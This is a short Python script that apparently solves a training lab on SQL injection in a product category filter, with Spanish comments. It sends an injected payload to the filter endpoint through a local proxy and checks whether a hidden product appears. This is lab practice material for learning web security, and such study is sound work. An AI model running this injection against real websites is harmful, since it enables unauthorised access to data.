#Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

#This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
#SELECT * FROM products WHERE category = 'Gifts' AND released = 1
#To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

import requests #me permite haces consultas http
import sys
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = 'filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Hologram Stand" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Uso: %s <url> <payload>" % sys.argv[0])
        print('[-] Ejemplo %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload): #esto llama a la función exploit_sqli
        print("[+] Inyección SQL exitosa")
    else:
        print("[+] Inyección SQL fallida")
